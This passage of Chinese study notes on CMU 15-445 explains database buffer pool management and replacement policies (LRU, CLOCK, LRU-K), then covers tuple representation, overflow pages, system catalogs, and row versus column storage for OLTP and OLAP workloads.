Pool中是否存在这个page，如果存在那就直接将它的指针提交给上层；如果不存在就需要到磁盘中拷贝一份数据放入内存中。这个过程中不会对数据进行任何的序列化处理，数据在磁盘中是怎样的，那么它在内存中就是怎样的。 定位内存中的page和在磁盘中遇到的一样，我们如何在内存中找到想要的page的位置呢？ 我们同样使用一个额外的indirection层来保存一个映射关系，即page表（注意跟磁盘中的page目录做一个区分），page表是一个hash表，通过它来跟踪内存中的page，我们可以根据page表和pageId来定位某个page存放在哪个frame中。 我们需要使用一些元数据来跟踪对于内存中page的操作，这里说以下Dirty Flag和Pin/Reference Counter Dirty Flag前面提到，当Buffer Pool满时我们需要换出一些page来将一些内存空间空出来给新的page。那么对于在内存中没有被修改的page，我们可以直接将它丢弃，这不会影响正确性，且减少了I/O操作，提高了性能。但是对于在内存中遭到修改的page，我们必须要将它们写回磁盘中，否则就会造成数据的缺失。 为了确认哪些page在内存中被修改，我们使用Dirty Flag对被修改的page进行一个标记。 Pin/Reference Counter这个元数据用于追踪使用该page的当前线程数量或是正在查询这个page的线程数，如果当前有线程在使用或查询该page，我们就不应该将它丢弃或是写回磁盘中，这种时候我们可以在page表中为这一项page加一个latch（锁）。 我们还需要额外去做一些事情来跟踪哪些page被修改了，上述两者只是其中的一部分，我们可能还需要追踪时谁修改了page。 上述内容可以很好的解释我们在数据库存储中说到的，为什么不适用OS（mmap）来帮我们进行内存管理？ 因为也许OS会提前将我们仍需要使用的page写出到磁盘中。 Locks vs Latchs为了防止混淆，我们做以下lock和latch的区分。 在数据库中，lock是更高级的逻辑原语，它用于保护数据库中的逻辑内容（如tuple，表，数据库），事务在运行时会持有lock，来支持并发操作同时保证操作的正确性。lock的内容是暴露给开发人员的，我们可以在运行查询时看到持有的是哪种lock。 latch是一种底层保护原语，它用来保护数据库内部的内容，例如保护数据结构和内存区域。在我们执行操作时会持有latch来保护某些东西，例如当我修改page表的内容时，我会在要修改的地方加一个latch，在修改后再将它释放。当我们使用latch时，不需要担心回滚操作。因为它是内部的东西，它会去更新数据库系统的物理数据结构，当我进行修改时，如果没能拿到对应的latch，那我就会终止操作，而不用担心回滚的问题。关于回滚的内容会在后续的并发控制的课上详细说明。 page表 vs page目录同样的，来区分以下page表和page目录。 page目录的作用是用来找到page在磁盘上的位置。我们对page目录所作的修改都必须持久化，它们必须被写到磁盘中，即使系统崩溃了，在恢复之后我们也能知道从哪里找到我们的page。 page表是内存中的映射，它将pageId映射到它们在Buffer Pool中frame的位置。它是一个暂时的东西，我们无须将它持久化保存在磁盘中。 内存分配策略全局策略中我们所作的策略是对全局有利的，我们会查看所有运行的查询和事务，再决定某个内容是否应该存储在内存中。 局部策略是针对单个查询或事务来说，我们尝试使用对它有利的分配方式，但这对其他查询和事务来说也许是非常不利的。 这两种策略没有优劣之分，根据实际情况来选择分配策略，在很多时候我们也希望对两种策略做一个折中处理。 Buffer Pool优化接下来我们详细的讨论如何优化我们的Buffer Pool，让它变得更加高效。 1.multiple Buffer Pool（多缓冲池）之前的例子中，我们都把Buffer Pool作为单个实体，但事实上我们可以拥有多个Buffer Pool，我们分配不同内存区域，每一个内存区域都有自己的一套pageId与frame的映射关系。 我们希望使用多个Buffer Pool的原因是我们可以在每个Buffer Pool根据存储数据的不同来定制不同的局部分配策略。例如我们可以让一个Buffer Pool来处理索引，另一个Buffer Pool来处理表，它们的访问模式和策略都不相同。显然，如果我们使用一个大的Buffer Pool来替代多个Buffer Pool，我们就不可能使用不同的分配策略了。 另一方面，使用多个Buffer Pool可以减少试图访问Buffer Pool的多个线程间争夺同一个latch的情况发生。因为我们拥有多个page表，在同一时间内不同线程可以访问不同的page表，这样就可以减少争夺latch的情况。 如何确定page在哪个Buffer Pool中？ Object Id 第一种方法是将page的record id保存到一个列表中，然后就能够根据record id找到对应的对象在何处（保存record id和位置的一一映射关系）。 Hashing 第二种方法是对传入record id进行hash，并使用record id对n（Buffer Pool的数量）进行取模，这就能快速得到数据的存放位置。 2.Pre-Fetching（预读）由于磁盘和内存处理速度的不匹配，我们希望尽可能减少从磁盘读入数据所带来的影响。举例说，对于一个要求全局遍历的查询请求之前，我们会从page0读入内存，当page0的数据全部处理完之后，再读入page1，处理page1的数据，再读取page2… 这种情况下，我们在解析查询请求的时候就知道了哪些page需要读入内存，也许我们能够在CPU处理数据时，让I/O去读下一个page（比如说处理机处理page0的数据时，I/O就去读page1的数据），做到处理机和I/O的并行操作，这样就能减少从磁盘读入数据带来的高额时间成本，同时降低整个查询的执行时间。 这个例子十分简单，实际上OS的mmap就能够做到提前读入下一个page（因为上例中的page之间本就是连续的）。 但是考虑一些复杂的情况，OS就不知道如何去预读page，但数据库可以。 如上图，我们要读取所有value值在100~250之间的tuple，我们可以在value上添加一个索引，在索引中记录了不同value的tuple所存放的位置，我们可以通过使用以上的索引结构来找到想要的page。 这些page在物理上的存储位置可能是非连续的（如图中的page3和page5），但是在有了索引之后我们就能够找到它们，并且完成预读。但是在这种情况下OS就无法进行正确的预读，因为我们想要的page是非连续的，它不理解查询的上下文语义，它不会知道为什么在预读了page3之后应该预读page5而不是page4。 3.Scan Sharing（扫描共享）首先说明以下，在某一个查询请求中，我们顺序扫描磁盘的page的时候，有一个游标，它一开始指向page0，当page0读出时它再指向page1，以此类推…..它会记录刚才扫描过的位置，这样我们在顺序扫描的时候就不用每次都从头再来。 对于扫描共享而言，它可以认为是不同查询请求之间互相搭顺风车，即后来的请求可以与先来的请求共享游标。 在扫描共享中，共享游标的查询请求不需要完全相同，只要两者都需要读取相同的page，它们就能够进行扫描共享。 扫描共享的大致流程为: DBMS工作后，某个查询A开始了一次扫描，过了一小段时间，查询B也开始了，查询B意识到它要扫描的page与A大致相同，这样它就可以把自己附加到查询A的游标上，当查询A拿到page时，查询B也会收到通知，所以查询B也可以去取数据。有一点需要注意的是，在B搭上顺风车之前，A可能已经读完了前面的一些page，但B现在漏读了这些page，所以最后B要从上顺风车的位置开始，逆向的扫描一开始漏掉的page。 我们据一个示例来具体说明： 如上图所示，一开始查询Q1开始执行，它要读取表A的全部内容，它现在读到了page3. 这时查询Q2出现了，它也需要读取表A的全部内容。 不考虑扫描共享的情况，如上图，Q2要读取page0进入内存，但事实上我们刚将page0换出内存，可以想到，这种情况会导致大量page的换入换出，导致两个查询出现争夺内存资源的情况。 如果我们使用了扫描共享，如上图，这时Q2就应该附加到Q1的游标上，即它也一起去读page3的数据，然后Q1和Q2能够随着Q1的游标继续读取page4，page5，这样就不会出现page不断换入换出的情况。 当Q1,Q2读完page5时，Q1的任务结束了，但Q2还需要从它搭上顺风车的位置（即page3），再回头去读取page2，page1，page0，这样Q2才能完成任务。（如上图） （Q1：在查询过程中会产生许多中间结果，如上图中Q2计算平均值就需要记录一些中间数据，这些中间数据是如何存储的？ A1：这些中间结果也需要存储在内存中，并且它们也是由一个单独的Buffer Pool保存的，但这个Buffer Pool是全局的还是私有的取决于具体实现方式。当这些中间结果过大导致内存溢出时，为了保存中间结果，我们也会将Buffer Pool中的page刷出到磁盘，为了保护某些page，我们会使用latch把page”固定住“，告诉管理器这个page还有用，不要将他刷回磁盘。） 上述Q1,Q2的例子引出了一个关于关系模型的很好的例子。假设上述Q2改为 SELECT AVG(val) FROM A LIMIT 100,即读出前100条tuple的val并取平均值，对于使用和不使用扫描共享的情况而言，这条语句所返回的结果也可能不同（从page0开始读100条或是从page3开始读100条），但是这样的结果是允许的，因为关系模型是无序的，我们存储的tuple之间没有明确的存放顺序（例如先放入的tuple在前面，后方的tuple在后面这类规则）。 所以无论我们从哪里开始读100条tuple来计算平均值，无论结果如何不同，它们都可以认为是正确的。 Buffer Pool Bypass这和刚才说到的存储中间结构的问题相关。当我们循序扫描时，需要读入大量的page，其中许多page在短时间内不会再复用，为了防止它们污染缓存，我们首先为每一个执行查询的线程分配一小块内存，当我们从磁盘中读入新的page时，不会将这些page放入buffer pool，而是将它放入线程的本地内存，当这次查询完成时，这些page全部会被丢弃。 OS page cacheOS page cache介于磁盘和操作系统之间。 我们对于磁盘的操作都是基于OS给我们提供的API（fwrite，fread）进行的，但另一方面OS也会维护自己的文件系统缓存。当数据库从磁盘中读取一个page时，OS也会在它的文件系统缓存中同样保存一份。显然这样做会浪费许多内存空间，大多数数据库系统不希望OS缓存这些page，所以它们通过direct I/O来做，不让文件系统对该数据进行缓存，又数据库自己来管理其中的内容。 OS page cache虽然会对每一个page多保存一个副本，但是当数据库将某个page做修改后，OS并不会对它保存的page做相应的修改。这样一来，OS保存的那一份page就不能称之为副本了（因为它没有与数据库中的那一份保持一致），它可以被认为是冗余的旧数据。这也是多数数据库系统不适用OS page cache的原因。 虽然大多数系统不希望这么做，但还是有少量数据库使用了OS page cache，例如postgreSQL。它们这么做可能是通过使用OS提供的服务来降低开发和维护的复杂度。 Buffer替换策略我们之前已经介绍过Buffer Pool的基本工作流程，现在我们要讨论在我想要读取一个page进入磁盘时，Buffer Pool的内存空间却满了的情况下，我们该怎么做。 对于Buffer替换策略，我们使用以下几点来评价它们的优劣。 正确性，当某个内存中的page还未使用完时，它不应该被替换或移除出去。 准确性，要确保我们替换出去的都是在短时间内不会用到的page。 速度，替换策略需要迅速，因为我们会使用latch来锁定某些page，我们不希望替换策略花费许多时间来找到能够被替换出的page。 元数据，我们不希望为了替换策略而维护追踪大量的元数据，不希望保存元数据花费的page甚至大于保存真实数据的page。 LRU（最近最少使用）在这个算法中，我们需要跟踪一个page最后一次被访问时的时间戳，每次我们都替换或移除时间戳最老的page。 我们可以维护一个数据结构（例如queue），它将page根据时间戳排序，每当某个page被读或写时，就将它从队列中拉出来，再放到队尾。每次需要换出page时，就将队首的page换出内存。 CLOCK这是一种LRU的近似算法，在CLOCK中，我们不去跟踪page最后一次访问的时间戳，我们需要去追踪的信息是每个page的标志位（reference bit），它表示自从上次检查该page后，这个page是否被访问。 我们将page组织成一个环形的buffer（就像钟一样），使用一个能够旋转的指针不断的移动去检查每个page的标志位是0还是1，如果是0就说明从上一次检查它之后，这个page没有再被某个线程访问，因此我们可以将它从buffer中移除。如果是1，说明上一次检查之后它被某个或某些线程访问了，我们将标志位改为0，继续检查下一个page。 对于某个page而言，无论它在某个时间段内被多少个线程访问，它的标志位都是置1，而不会因为访问次数增多而累加（不会变成2，3，4，5…） 上图中，我们执行CLOCK算法找出要被替换的page，首先是page1，它的ref标志位为1，我们将其改为0，并将指针移到page2检查。 发现page2的ref标志位为0，就将page2置换出去。 再举一个例子。假设这时page1，2，3，4的ref标志位都为1，那么在指针检查完所有page一遍后，所有page的ref全都变为0，这时指针再次回到page1，发现page1的ref位为0，所以将page1置换出去。 在CLOCK算法中，实际置换出的不一定是最久未被访问的page，我们只关注一段时间内未被访问的page，而当有多个page在一段时间内都未被访问时，我们不需精确的找到最久未被访问的那个，只要从中抽出一个page，并将它置换出去就行。 LRU和CLOCK存在的问题在简单的情况下，例如进行点查询（point query）时访问单个数据（例如page），它们的效果都挺好。但是它们都容易受到sequential flooding的影响，sequential flooding即我们的查询请求需要读取每个page，这可能会污染我们的page缓存。因为它读取了一堆page，且所有这些page都比我最近缓存的page的时间戳更新，这时LRU或CLOCK算法会将最近使用的page换出，但事实上这个最近使用的page也许是我们之后需要用到的，而真正应该被换出的应该是较新的这些page。 为了应对这种情况，我们可以选择三种改进的策略。 LUR-K为了解决算法污染问题，LRU-K将“最近使用过1次”的判断标准扩展为“最近使用过K次”。 相比于LRU，LRU-K算法中的K表示对每个缓存在内存中的page的访问次数进行计数，我们会多维护一个历史队列，来记录所有缓存page的访问历史。当page的访问次数达到K次后才将其放入缓存。当需要置换数据时，LRU-K会淘汰第K次访问时间据现在时间最长的page。 这种方法通过历史数据的访问时间间隔来预测未来的数据访问规律。 对于较为复杂的数据库系统来说，它们会采用LRU-K的做法。 Localization这种方法是使用多个buffer pool让查询请求本地化，我们在之前讨论过相关的做法。我们将本次查询所涉及到的page单独放到某一块buffer中，其他查询请求也能读取到它们，但是在我们要替换出page时，我们只会选择在当前查询请求下访问最少的page做置换，而不是从全局的角度看谁被访问的次数最少。 即我们不关心其他查询请求访问了这个page多少次，只要在本次查询请求中它的被访问次数是最少的，那么它就应该被置换出去。 Priority Hints我们可以提供一些暗示给buffer Pool来提醒它哪些page是重要的，而哪些page是不重要的。 这似乎比较抽象，我们给出一个例子来说明。 对于Q2来说，我们需要从表A中得到id为特定值的tuple。 当我们使用索引（例如B+树结构），我们在每一次查询时都需要从根节点进入，然后一直向下直到叶节点。假设我们在将叶节点读入内存时，我们的buffer Pool已经满了，这时就需要选择一个内存中的page置换出去，根据最近最少使用的原则，index—page0（也就是根节点）会被置换出去。但是我们知道，当下一次再次出现查询请求时，我们仍然需要使用索引结构，仍然需要从根节点开始查找数据，那么根节点立刻会被再次读入内存。 我们的priority hint就是在这种情况下，一定不会选择根节点置换出内存，而是选择中间的非叶节点置换出去（即便最近最少原则指向的是根节点）。在特定的环境下，让数据库理解上下文信息，这样它就能够根据这些“hint”来更好的执行置换算法。 Dirty page（脏页）在每一个page上会有一个dirty bit，它会告诉我们自从它进入buffer pool后，是否有查询对该page的内容进行了修改。 当我们执行替换策略时，最好的方法当然是找到一个未被标记为dirty的page，然后将它直接移除，再将新读入的page放到这个frame中。假设我们要换出一个dirty page，在将新的page读入内存之前，我们需要将这个dirty page安全的写回磁盘中。 这时我们就需要在替换策略上做一个取舍，在dirty page的基础上，我们会更希望找到未被标记为dirty的page，然后直接移除它来空出内存空间，但这些未被标记为dirty的page可能在短时间内会被再次用到，这种情况下也许我会考虑多花一些代价选择一个dirty page置换出去（保留非dirty page） 这种情况下的取舍是十分困难的，在不同的情景下不同的选择的代价也不同，没有一个绝对的结论告诉我们如何选择。 Background Writing（后台写入）要解决Dirty page下页面置换的两难问题，即为了避免必须立即将page写出以便在buffer pool释放可用空间的问题，我们可以使用后台写操作。 我们在数据库系统中创建一个执行定时任务的线程，每隔一段时间它会去buffer pool中找出dirty page，然后将其写出到磁盘上（但是page仍然保留在buffer pool中，只是将修改数据更新到磁盘），这样dirty page就变成clean的了。当我们执行替换策略时，我们就有更多clean page可以直接移除而不用写回磁盘。 不过在这个过程中要注意，在修改的内容尚未写入到日志之前，我们不希望将dirty page写回磁盘。 这样做的重点在于，我们可以使用在平时闲置的I/O资源来将dirty page写回磁盘，而不是只有在需要被置换时才写回磁盘。 总结这节课的重点在于我们要如何去管理内存并做的比OS更好，因为我们知道查询的语义，我们知道page中的内容，我们知道这些数据如何被访问，我们可以使用更多的优化来提高性能和效率。","categories":[{"name":"cmu15-445","slug":"cmu15-445","permalink":"http://yoursite.com/categories/cmu15-445/"}],"tags":[]},{"title":"CMU15-445学习笔记-数据库存储part2","slug":"cmu15-445-数据库存储part2","date":"2020-05-20T10:01:10.000Z","updated":"2020-08-30T04:03:24.315Z","comments":true,"path":"2020/05/20/cmu15-445-数据库存储part2/","link":"","permalink":"http://yoursite.com/2020/05/20/cmu15-445-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8part2/","excerpt":"","text":"面向磁盘型数据库系统page布局log-structured上节课我们在讲到page布局时说到了tuple-oriented的方式，使用slotted page的方法将每一个tuple对应的偏移量保存在slot中，这样就能在定位到tuple在page内部的位置。这节课将会补充说明另外一种log-structured方法。 这种组织方式不是将所有tuple存放在page内，而是去存储这些与创建tuple，修改tuple相关的日志信息。在page内部，我们不断的追加日志信息，并且这些信息是以文本形式存储的。当我们对tuple执行某项操作（insert xxx,update xxx等)，我们只需要将这个操作记录为一个日志条目并且追加到page的尾部就行。 log-structured的页存储方式 这样做的一大好处就是操作起来更快，对于磁盘来说，循序访问的速度要快于随机访问。如果我们使用slotted pages方式组织page，假设当前我要去更新10个tuple，它们在不同page上，那我就需要在10个page上来写入并更新这些tuple。但如果我使用log-structured的方式，那么我就能够将10条更新语句写在单个page上，一次就能搞定。 这项技术在HDFS和S3之类的分布式文件系统中只支持这种追加的page组织方式。 但这种方式的一大缺陷就是读取十分麻烦，当我们要读取一条tuple时，我们就需要从page的最后一条日志反向查找，看看有关这条tuple的日志中记录的最终值是多少。当我们对tuple进行批量操作的时候，这个弊端就更加显著。 我们可以使用几种方式来加速的过程，我们可以建立索引，记录不同tuple对应日志的偏移量，读取时我们跳到特定的偏移量处就能读出我想要的数据。 我们也可以周期性的压缩日志。即重新把日志从头走一遍，这样一来我们就能知道当前情况下各个tuple的值是多少，我们可以把之前的日志全部删除，只保留tuple当前的值。（如下图所示）这也能解决日志无限增长占用大量空间的问题。 虽然我们介绍了log-structured的方法，但是本课程中我们假设我们面对的是slotted page型数据库。 使用tuple表示数据前面我们讲到了数据库是由一系列page组成的，讨论到了如何将heap文件拆分为page，接着说到了page内部的slot数组。现在我们想知道在tuple内，我们如何去表示不同属性或列的数据。 在高级层面而言tuple只是一串字节序列，而数据库管理系统需要去解释它的意思，弄清楚它的类型。这节课上，我们需要把这些字节数组组织成tuple，然后当数据库执行查询时，我们要去解释这些字节数组中的实际内容，以此来生成我们所寻找的答案。 在大部分数据库中，例如对于固定长度的类型（integer，bigint，smallint，float/real），我们使用的表达方式与C和C++相同（遵循IEEE-754标准），对于不定长类型我们的表达方式则有所不同。 基本上讲，float/real属于浮点数，numeric/decimal属于定点数，定点数的表达方式需要我们在数据库中自行实现。 对于可变长度类型（varchar，text，blob等），它们一般有一个头部，它会保存数据的长度，在头部后面跟着真实数据的字节序列。与C中的字符串不同，C是在结束位置提供一个‘/0’作为终结符，但这里我们使用一个前缀来指明数据的大小。 对于time/date/timestamp类型，大多数数据库会保存从1970年1月1日起的秒数或毫秒数甚至微秒数来处理时间。 浮点数（float/real）和定点数（decimal/numeric）对比对于float，real/double这些可变精度类型，它们是CPU或C++提供给我们的不精确数字。 浮点数执行操作的速度要比定点数快得多，因为CPU有能够高效处理浮点数操作的指令，一条CPU指令就能对两个浮点数进行相加或想相。但处理定点数时，我们需要写一大堆东西对它们进行处理，这意味着对于定点数的操作，需要执行更多的指令。 从效率角度而言，我们似乎更应该使用浮点数，但是这也存在一个问题，浮点数存在舍入误差，这在很多情况可能导致严重的问题（航天工程，金融系统等）。 #include&lt;stdio.h&gt;int main(){ double a=0.1; double b=0.2; double c=0.3; if(a+b==c) printf(“true”); return 0;} 执行上述代码，我们可以发现并不会输出“true”，为什么0.1+0.2≠0.3？这就是因为double存在舍入误差，在IEEE-754标准中无法精确的表示浮点数。 为了避免不准确的数据造成错误，我们选择使用定点数。这也是我们要在数据库中自行实现的内容。 （Andy在课堂上对于real和decimal类型的数据处理做了上机演示，结论是decimal类型的数据处理时间比real慢了一倍，但real的计算结果会存在精度问题。） 下面我们看一看PostgreSQL中numeric类型的结构（由于PostgreSQL是开源而其他两个数据库是闭源的，所以举它的例子）。 PostgreSQL中numeric类型的结构 可以看到，表示numeric类型具体数值的部分其实是使用unsigned char来存储的，所以对于numeric数据类型而言它们需要自行编写对应的数据处理函数，这也导致了numeric类型的数据处理效率较差（float，double这些浮点数的数据处理有对应的CPU指令） 存储一个过大的数据overflow page我们会遇到一些情况导致我们要存储的数据无法保存在单个page下，我们使用overflow page来解决这个情况。 下面这个例子中，该tuple的属性c由于过大无法与其他属性放在同一个page中。所以我们通过保存一个指针在属性c处，通过这个指针来指向保存了真实数据的overflow page。 overflow page 当一个查询请求属性c作为输出的一部分时，就根据这个指针，找到对应的page，并将它拷贝下来，并生成一个输出结果。 同样的，如果属性c的数据大到无法在一个page中存放，那么就从属性c中继续拆分一些数据，存放在另外的overflow page，并在当前overflow page中存储到对应page的指针。 多级的overflow page 对于overflow page中的数据，依然应该具备常规数据应有的保护措施，但是我们难以通过常规手段对overflow page进行操作，所以需要针对overflow page进行各种各样的优化。在PostgreSQL中，大部分时候这些overflow page都是只读的，很少在上面写入东西，这样可以尽可能的降低维护overflow page的复杂度。 外部存储除了将过大的数据存储在overflow page，我们还可以使用外部存储来存放数据。 其基本思路就是我们不将属性的数据保存在tuple内部，而是保存一个指针或是文件路径，它们指向了存储数据的本地磁盘，网络存储或是某些外部设备。 一般情况下，我们只能读取存放在外部存储的数据，而不能操作它。但是如果有人在数据库系统之外对该文件进行了修改，那么我们应该能够发现其中的变化，因为外部存储实际上超出了我们数据库系统的控制范围和保护范围。 什么情况下我们会使用外部存储？对于一些视频网站而言，它们需要保存使用者上传的视频文件，这些视频文件大多超过1G，我们不可能把这些视频文件全部放入数据库中，因为这会占用非常庞大的空间，且代价极高。所以我们可以将这些视频文件存储到更便宜的外部设备上，以此来降低成本。 那么我们来说什么时候使用overflow page，什么时候使用外部存储呢？ 在2000年左右的时候，任何小于256KB的数据，我们会将它保存在一个overflow page中；任何大于256KB中，我们会将它保存在外部存储上。但是这都不是硬性要求，这只是经过性能和经济方面的考量后，所得到的结果。 system catalogsystem catalog中保存了数据库相关信息的元数据，包括表名，索引以及用户权限等等。多数数据库系统会将它们的catalog使用一张表来存储。 同时，数据库系统也会提供某种底层的方法来访问catalog，在早期，不同的数据库系统都有它们自己的catalog和对应不同的访问方式，这对于用户而言十分不友好，当应用程序从一个数据库系统迁移到另一个数据库系统时，我们需要根据新的数据库系统的catalog来重写相关的代码。 为了解决这些catalog多样化带来的问题，ANSI标准以及SQL标准定义了一种称为INFORMATION_SCHEME的catalog接口，每个数据库系统都需要支持它。但不同的数据库也额外使用了不同的快捷方式来得到这些数据。下图就是不同数据库中查看catalog的方式。 我们可以使用这些命令看一看catalog具体是怎样的（只列出postgreSQL的情况，其他数据库可以自行尝试） 使用/d得到所有表的列表 使用/d+得到更多的信息 对某张表是用\\d+ &lt;db_name&gt;得到这张表的scheme 我们可以根据catalog中所展现的表的scheme去解析存储在数据库中的tuple，之前提到对于存储层而言，我们的tuple只是一串字符序列，它没有任何意义，但数据库有义务对这一串字符序列进行解释。如图中的例子，通过scheme，我们可以知道这个tuple的第一个属性是integer，它占了32位空间，第二个属性也是integer，它也占了32位空间，这样我们就能够来划分字符序列，并将它解释为一个有意义的tuple。 通过关注数据库的catalog，我们可以跟踪查看我们的scheme，当我们去查询以及构建索引时，会使用到它，并决定我们如何去做。通过scheme，我们可以了解数据的布局，从而将一条字符序列解释为tuple，但是注意，如果我们需要对每一条tuple都分析数据布局，这实际上会很慢，因为重复了大量冗余的操作（同一个表下的tuple数据布局都是一样的），在高级的系统中，可以在运行时进行编译或是代码生成来减少重复的解释操作（例如通过JVM中的JIT(Just-in-time）编译来对这些操作进行编译）。 存储模型在第一节课上提到了关系模型（Ted Codd的论文）但它并没有说明我们该如何去存储数据（字节数组，类型等内容），它甚至没有说明我们需要将tuple的所有属性保存在内存或磁盘中。到目前为止，我们在课堂上可视化数据库时，我们都是使用行来表示某个tuple的所有属性，但对于某些workload来说，这不是最好的处理方式。 workload在本门课的数据库系统中，我们所关心的workload有两种，OLTP和OLAP。 OLTP（On-line Transaction Processing）OLTP被称为联机事务处理，当我们构建一个新的应用程序时就会遇到它（website，app等）。OLTP的思路是我们从外界取得新的数据后，将它们放入我们的数据库，这些操作非常简单，它们一般只涉及小部分数据的更新或读取。 举例来说，对于电商平台，当我在网站上购买东西的时候，就是对应用程序的OLTP（即联机事务处理），因为我会向我的购物车里添加商品，然后结账，最后更新我的账户信息。由于电商平台总会有很多人浏览并购买东西，所以它会处理大量的这种操作。但从一名顾客的角度而言，我不会更新太多数据，我更新的是我的账户信息，我的购物车信息，这些查询和更新只会访问数据库中很小的一部分信息（只访问属于我的那一小撮信息）。 上图是wikipedia内部的例子，我们有三张表，在revision表中，我们保存的是每篇文章的更新记录，在pages表中有一个对revision的外键引用，表示这是该page的最新版本，使用者可以无须扫描，直接跳转到此处取数据。然后我们对这些表执行OLTP操作。 第一个SQL语句可以拿到page当前的revision，第二个SQL语句表示使用者在登陆账号时更新他的账号登陆信息。这些操作都只会访问小部分的tuple。在OLTP中我们会不断重复做这类事情。 OLAP（On-line Analytical Processing)OLAP被称为联机分析处理，当我们从OLTP应用程序中收集到一大堆数据时，我们会想去分析它，并从中得到新的信息，这也被称为数据科学，即从已有的数据中派生处新的信息。 在这种情况下，我们不会去更新数据，它所要做的就是从已有的信息中为我们分析提供新的信息，我们会试着让这些信息变得有意义。 我们还是以上述的wikipedia为例子。 这条SQL语句会去统计每个月里，主机名以.gov结尾的用户登陆数量。这种类型的查询就是只读的，它会去读取大量数据，例如扫描整张表。在OLTP（联机事务处理）中，我只会去更新一个东西，但是对于OLAP（联机分析处理）来说，我要去做大量的join，并读取大量的数据。 OLTP与OLAP的对比 上图可以粗略的表达不同workload的操作复杂度，可以看到，OLTP擅长简单的查询，但会做大量的写入操作；OLAP会做大量的读操作，并且它更复杂。图中我们还能看到一种新的workload，它被称为混合事务分析处理（HTAP），它试着将OLTP和OLAP混合在一起，既想要提取数据，又想在拿到数据时对它进行分析。 （Q1：OLAP和NoSQL或NewSQL系统间的关系是什么？（课堂内容） A1：图上的这些（OLAP,OLTP,HTAP）是workload的类型，而NoSQL和NewSQL是DBMS系统类型。对于传统的NoSQL系统，MongoDB，Cassandra以及Redis来说，它们属于靠近OLTP那块，我们主要往它们塞入新数据。 NoSQL大约在2000年末时出现，许多公司为此投入大量资金，例如google，它们推出了HBase，BigTable和Hadoop，这些系统不去执行SQL，也不进行事务处理，更不会进行join操作，这就是它们能够扩展的原因。Hadoop具有在线分析处理的能力（OLAP），但像BigTable，Cassandra，MongoDB以及其他一些NoSQL数据库具备的则是OLTP联机事务处理的能力。 然后人们开始意识到他们想要处理事务的能力，想要SQL，也想去进行某些join操作，因此，NewSQL应运而生。他们想要实现的想法是，在不放弃事务的前提下，拥有快速处理事务的能力和OLTP。 ) n-ary存储模型（行存储模型）我们再次回到存储模型的主题上来，目前我们展示tuple时，我们总是以行的方式展现它。这被称n-ary存储模型，它的基本思路是将单个tuple的所有属性，连续的存储在同一个page中，对于体积较大的数据我们也可以使用overflow page，但基本思路都是一样的。 这是关于OLTP的一个想法，因为我们每次去访问的数据量在粒度上足够小（只访问少量tuple的全部属性），这样就能够访问单个实体，并拿到我的账户信息，我的订单信息，以及有关我账号的全部信息。我不需要关心其他几百万用户的信息，我只需要我自己的账号信息。如果它使用一行数据将我的账户信息连续存储，那么我的访问操作就非常的高效（相比column存储），我们只需要跳转到对应的page，并取到我想要的数据就结束了。 上图是使用n-ary存储模型时，我们执行SQL查询时的流程。通过该SQL语句我想要根据用户名和账号拿到账号信息，我们可以通过索引来查找（后续介绍），得到tuple所在的page id和slot number，然后我们通过一次查找和读取，将page放入内存中，并跳转到对应偏移量得到我想要的数据。对于插入操作也是类似，只需要找到一个空的slot，并将数据一次性写入就行。 在这类请求下，将一个tuple的所有数据连续存储是读取数据时最高效的方式。 那么在什么情况下，行存储是低效的呢？ 回头看看这条SQL语句（上面OLAP处提到过它的内容）。当我们执行这条SQL语句时，我们实际上要对整个用户账号表进行扫描，根据hostname来找到以.gov结尾的账号。 简单来说，我们只需要hostname和LastLogin这两个属性，就能够得到最终结果。由于行存储模式下，我们将一条tuple的全部属性连续存储在一起，且在非易失型存储设备中，我们每次读入读出都以page为单位，这两条限制导致我们可能会将其他不需要的属性一起读入内存（userId，userName，userPass）。可以看到我们读入了五个属性，但其中包含了三个没用的属性，当我们的数据量达到PB级别的话，这是非常低效的 总结一下行存储模型，在n-ary存储模型中（行存储模型），当我们访问整个tuple的时候，即插入，更新以及删除tuple时的速度很快。但如果我们要进行一些分析型的查询以及做些OLAP工作并且想要扫描整张表的大部分内容时，n-ary存储模型就十分废柴了，因为我们会向内存中读入一大堆我们不需要的数据。 为了解决n-ary存储模型所不能应对的情况，出现了column存储模型。 column存储模型（列存储模型）在列存储模型中，我们不会将单个tuple的全部属性放在单个page上，而是将所有tuple的某个属性放在同一个page中，即将单个列的所有值连续保存在一起。这对于OLAP而言十分友好，我们可以读取表的部分属性集合，而不是像行存储模型一样将全部属性读出。 回到上一个例子，这一次我们使用列存储模型。这一次我们只需将保存hostname的page放入内存中，并对每个hostname进行扫描匹配，这样我们就得到了能够匹配的tuple，接着把存储lastLogin的page读入内存，找到对应的lastLogin的值，最终生成输出结果。 可以看到这一次我们只需要读取2个page（存储hostname和lastLogin的page），就能够生成输出结果，而行存储则需要读取全部page，考虑在极端情况下，如果我有上亿个page，行存储模式的优越性就很明显。 压缩数据同时，列存储还有一个优点就是可压缩。对于行存储模型而言，不同属性对应的数据类型不同，在存储时，这些不同类型的数据被连续的存放在一起，显得十分散乱，我们难以直接分辨它们，所以对于行存储的压缩是较为困难的。 但对于列存储模型来说，一个page只会存放同一个属性的值，这些数据的类型显然是相同的，并且其中某些数据的值可能是相同的，那么我们就能够对它们进行压缩。 举例来说，我们要存储室内不同时间的温度，现在室内的温度是36度，一小时之后温度是36.1度，两小时后是36.2度，这些温度没有太多波动，我们无需完整的保存每次的温度数据，只需要将第一次记录的温度作为标准，然后记录每次新的温度和标准之间的差值即可，这样我们就能够保存较小的值。 对于原先只能存放1000个tuple的page，也许在进行了压缩之后，能够存放10000个数据。并且某些系统可以在未解压的情况下直接对数据进行操作，这就很美妙了… 定位tuple的属性在列存储模式中，是否会将主键和每一个属性一起保存，即如何弄清某个hostname一开始是在哪一条tuple中？ 我们有两种方法做这件事。 Fixed-length Offsets 第一种方案使用固定长度的偏移量，也就是说对于一列中的每个值而言，它的长度是固定的。 如上图，如果我们知道pageA中的一个属性x的偏移量d，该如何定位pageB中与x同属于一个tuple的属性y的偏移量D呢？ 由于所有属性都是定长的，假设pageA中单个属性的长度为32位，而pageB中单个属性的类型为8位，那么我们首先确定x在A中的rowId（或者叫slot number，怎么命名取决于自己，但是不要和之前讲的那些弄混了） rowId=d/32 然后就可以得到y在pageB中的偏移量D=indexA*8 经过很简单的计算就能够得到数据的位置。 但是如果遇上可变长类型怎么办？ 